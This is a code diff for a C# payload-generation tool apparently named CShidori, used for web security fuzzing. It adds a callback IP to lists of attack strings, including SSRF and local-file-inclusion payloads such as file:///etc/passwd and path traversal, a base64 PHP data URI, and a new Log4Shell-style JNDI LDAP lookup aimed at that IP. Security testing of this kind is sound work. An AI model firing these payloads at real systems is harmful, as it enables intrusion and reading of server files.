@@ -2,6 +2,7 @@
 using System.Linq;
 using System.Web;
 using System.Collections.Generic;
+using System.Net;
 
 
 namespace CShidori
@@ -14,6 +15,7 @@ namespace CShidori
         {
 
             List<string> results = new List<string>();
+            string ip = new Misc().GetIp();
             
             String[] misc = new string[] {
             "", "*",";", "&", "%", ";", "[", "]", "(", ")","|", "?", "\\", "'", "\"", "@", "#", "!",
@@ -74,7 +76,7 @@ namespace CShidori
             results.AddRange(ssti);
 
             String[] rfi = new string[] { // LFI and SSRF and openredirect
-            "http://127.0.0.1/", "https://127.1/", "ftp://0x7f000001/", "smb://0000::1:445/", "file:///etc/passwd",
+            "http://"+ip+"/", "http://127.0.0.1/", "https://127.1/", "ftp://0x7f000001/", "smb://0000::1:445/", "file:///etc/passwd",
             "./../../../etc/passwd", "zip:///filename_path", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
             ".", "\\", "/", "..//", "....\\\\", "c$:\\",
             };
@@ -108,7 +110,12 @@ namespace CShidori
             results.AddRange(get);
 
 
-            
+            String[] java = new string[] {
+            "${jndi:ldap://"+ip+"/a}",
+
+            };
+            results.AddRange(java);
+
 
             String[] bof = new string[] {
                 string.Concat(Enumerable.Repeat("%s", 10)), // format string
